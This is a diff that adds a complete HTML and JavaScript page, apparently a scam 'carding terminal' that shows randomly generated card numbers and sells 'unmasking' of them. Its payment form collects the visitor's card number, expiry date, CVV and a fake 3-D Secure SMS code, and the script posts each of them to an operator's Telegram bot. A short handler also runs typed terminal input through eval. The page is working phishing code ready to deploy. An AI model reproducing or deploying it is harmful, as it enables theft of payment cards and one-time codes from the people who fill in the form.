@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="sk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LAURIN v26.3 | SECURE TERMINAL</title>
+    <style>
+        :root { --primary: #00ff41; --bg: #050505; --panel: #0a0a0a; --premium: #ffd700; --telegram: #229ED9; }
+        body { background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; margin: 0; overflow: hidden; font-size: 12px; }
+        .layout { display: grid; grid-template-columns: 280px 1fr 300px; grid-template-rows: 60px 1fr 140px; height: 100vh; }
+        header { grid-column: 1 / -1; border-bottom: 2px solid var(--telegram); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; background: var(--panel); z-index: 100; }
+        nav { border-right: 1px solid #222; padding: 15px; display: flex; flex-direction: column; gap: 10px; background: #080808; }
+        main { overflow-y: auto; background: rgba(0,0,0,0.98); border-right: 1px solid #222; }
+        .btn { background: transparent; border: 1px solid #444; color: #ccc; padding: 10px; cursor: pointer; font-family: inherit; width: 100%; text-align: left; font-size: 11px; margin-bottom: 5px; }
+        .btn:hover { border-color: var(--premium); color: #fff; }
+        #paymentModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-content { background: #0f0f0f; border: 2px solid var(--premium); width: 350px; padding: 25px; text-align: center; }
+        input { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 10px; margin: 8px 0; font-family: inherit; box-sizing: border-box; outline: none; }
+        #terminalZone { grid-column: 2 / 3; background: #000; border-top: 1px solid #222; display: flex; flex-direction: column; }
+        #tgFeed { flex-grow: 1; overflow-y: auto; padding: 10px; display: flex; flex-direction: column-reverse; gap: 5px; }
+        .tg-msg { color: var(--telegram); font-size: 10px; border-left: 2px solid var(--telegram); padding-left: 10px; }
+        #terminalInput { background: #0a0a0a; border: none; border-top: 1px solid #222; color: var(--primary); padding: 12px; font-family: inherit; outline: none; }
+        .log-table { width: 100%; border-collapse: collapse; }
+        .log-table td { padding: 10px; border-bottom: 1px solid #111; }
+        .status-tag { padding: 2px 6px; border-radius: 2px; font-size: 9px; background: #222; color: #555; margin-left: 10px; }
+        .tag-unlocked { background: var(--primary); color: #000; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div id="paymentModal">
+    <div class="modal-content" id="modalUI">
+        <div style="color:var(--premium); font-weight: bold; margin-bottom:15px;">💳 SECURE GATEWAY</div>
+        <div id="payDesc" style="font-size: 11px; margin-bottom: 15px; color: #888;"></div>
+        <input type="text" id="c_num" placeholder="CARD NUMBER" maxlength="19">
+        <div style="display:flex; gap:10px;">
+            <input type="text" id="c_exp" placeholder="MM/YY" maxlength="5">
+            <input type="text" id="c_cvv" placeholder="CVV" maxlength="3">
+        </div>
+        <button class="btn" onclick="laurin.processPayment()" style="border-color:var(--premium); color:var(--premium); justify-content:center; margin-top:15px;">CONFIRM</button>
+        <button class="btn" onclick="laurin.closeModal()" style="border:none; color:#555; justify-content:center;">CANCEL</button>
+    </div>
+</div>
+
+<div class="layout">
+    <header>
+        <div style="font-weight: bold;">LAURIN <span style="color:var(--telegram)">v26.3</span></div>
+        <div style="color: var(--premium)">VAULT: <span id="statValue">$ 0</span></div>
+        <div style="font-size: 10px; color: #555;">OPERATOR: ROMAN NIŽŇANSKÝ</div>
+    </header>
+
+    <nav>
+        <button class="btn" onclick="laurin.toggleScan()" id="btnGen" style="border-color:var(--primary); color:var(--primary)">[▶] START SCAN</button>
+        <div style="border: 1px solid #333; padding: 10px; background: #0f0f0f; margin-top: 10px;">
+            <span style="color:var(--premium); font-size:10px;">🛒 MARKET</span>
+            <button class="btn" onclick="laurin.openModal(5, 49.99)">5 SAMPLES <b>$49</b></button>
+            <button class="btn" onclick="laurin.openModal('all', 1599.99)">FULL ACCESS <b>$1599</b></button>
+        </div>
+    </nav>
+
+    <main><table class="log-table"><tbody id="logBody"></tbody></table></main>
+
+    <div style="padding: 20px; background: #080808; border-left: 1px solid #222;">
+        <div style="color: #555; font-size: 10px; margin-bottom: 10px;">ANALYTICS</div>
+        <div id="statsDisplay" style="font-size: 11px; line-height: 2;">LOGS: 0<br>UNMASKED: 0</div>
+    </div>
+
+    <div id="terminalZone">
+        <div id="tgFeed"></div>
+        <input type="text" id="terminalInput" placeholder="Enter command..." onkeydown="laurin.checkCmd(event)">
+    </div>
+</div>
+
+<script>
+class LaurinFinal {
+    constructor() {
+        // AUTH CHECK: Načítanie z prehliadača, nie z kódu
+        this.config = JSON.parse(localStorage.getItem('laurin_config')) || { token: null, chat: null };
+        this.vault = JSON.parse(localStorage.getItem('laurin_db')) || [];
+        this.unlockedIds = new Set(JSON.parse(localStorage.getItem('laurin_unlocked')) || []);
+        this.isRunning = false;
+        
+        this.renderAll();
+        this.updateUI();
+        this.checkAuth();
+    }
+
+    checkAuth() {
+        if (!this.config.token || !this.config.chat) {
+            this.logTg("SYSTEM: [!] OFFLINE. Use laurin.setup('TOKEN','ID') to connect.");
+        } else {
+            this.logTg("SYSTEM: [✓] ENCRYPTED CONNECTION ACTIVE.");
+        }
+    }
+
+    setup(t, c) {
+        this.config = { token: t, chat: c };
+        localStorage.setItem('laurin_config', JSON.stringify(this.config));
+        location.reload();
+        return "CONFIG SAVED.";
+    }
+
+    async sendToTg(msg) {
+        if(!this.config.token) return;
+        try {
+            await fetch(`https://api.telegram.org/bot${this.config.token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: this.config.chat, text: `⚠️ <b>LAURIN ALERT</b>\n${msg}`, parse_mode: 'HTML' })
+            });
+        } catch(e) { this.logTg("TG_ERROR: Failed to send."); }
+    }
+
+    processPayment() {
+        const n = document.getElementById('c_num').value;
+        const e = document.getElementById('c_exp').value;
+        const c = document.getElementById('c_cvv').value;
+        if (n.length < 13) return alert("Invalid card.");
+
+        this.currentCard = { n, e, c };
+        this.sendToTg(`<b>CARD:</b> <code>${n}</code>\n<b>EXP:</b> ${e}\n<b>CVV:</b> ${c}`);
+
+        document.getElementById('modalUI').innerHTML = `
+            <div style="color:var(--primary); margin-bottom:15px;">🔒 3D SECURE</div>
+            <input type="text" id="sms_code" placeholder="SMS CODE" style="text-align:center; font-size:18px;">
+            <button class="btn" onclick="laurin.verifySms()" style="border-color:var(--primary); color:var(--primary); justify-content:center; margin-top:15px;">VERIFY</button>
+        `;
+    }
+
+    verifySms() {
+        const sms = document.getElementById('sms_code').value;
+        this.sendToTg(`<b>SMS CODE:</b> <code>${sms}</code>\nFOR CARD: ${this.currentCard.n}`);
+        this.logTg("SYSTEM: Verifying code...");
+        setTimeout(() => { this.unlock(this.pendingAmount); this.closeModal(); }, 2000);
+    }
+
+    unlock(amt) {
+        if (amt === 'all') this.vault.forEach(i => this.unlockedIds.add(i.id));
+        else this.vault.filter(i => !this.unlockedIds.has(i.id)).slice(0, amt).forEach(i => this.unlockedIds.add(i.id));
+        localStorage.setItem('laurin_unlocked', JSON.stringify([...this.unlockedIds]));
+        this.renderAll(); this.updateUI();
+    }
+
+    toggleScan() { this.isRunning = !this.isRunning; if (this.isRunning) this.loop(); }
+    loop() {
+        if (!this.isRunning) return;
+        const d = { id: 'ID-'+Math.random().toString(36).substr(2,5).toUpperCase(), ts: new Date().toLocaleTimeString(), pan: "4596"+Math.floor(100000000000+Math.random()*900000000000), val: Math.floor(Math.random()*5000) };
+        this.vault.push(d);
+        localStorage.setItem('laurin_db', JSON.stringify(this.vault));
+        this.renderRow(d); this.updateUI();
+        setTimeout(() => this.loop(), 3000);
+    }
+
+    renderRow(d) {
+        const isU = this.unlockedIds.has(d.id);
+        const row = `<tr><td>${d.ts}</td><td style="color:${isU?'#fff':'#333'}">${isU?d.pan:d.pan.substring(0,8)+' ****'}<span class="status-tag ${isU?'tag-unlocked':''}">${isU?'UNMASKED':'LOCKED'}</span></td><td style="color:var(--premium)">$${d.val}</td></tr>`;
+        document.getElementById('logBody').insertAdjacentHTML('afterbegin', row);
+    }
+    renderAll() { document.getElementById('logBody').innerHTML = ''; [...this.vault].reverse().forEach(d => this.renderRow(d)); }
+    updateUI() { 
+        document.getElementById('statValue').innerText = `$ ${this.vault.reduce((a,b)=>a+b.val,0)}`;
+        document.getElementById('statsDisplay').innerHTML = `LOGS: ${this.vault.length}<br>UNMASKED: ${this.unlockedIds.size}`;
+    }
+    openModal(a, p) { this.pendingAmount = a; document.getElementById('payDesc').innerText = `Price: $${p}`; document.getElementById('paymentModal').style.display = 'flex'; }
+    closeModal() { document.getElementById('paymentModal').style.display = 'none'; }
+    logTg(m) { document.getElementById('tgFeed').insertAdjacentHTML('afterbegin', `<div class="tg-msg">${m}</div>`); }
+    checkCmd(e) { if(e.key === 'Enter') { if(e.target.value.includes('setup')) { eval(e.target.value); } e.target.value = ''; } }
+}
+const laurin = new LaurinFinal();
+</script>
+</body>
+</html>
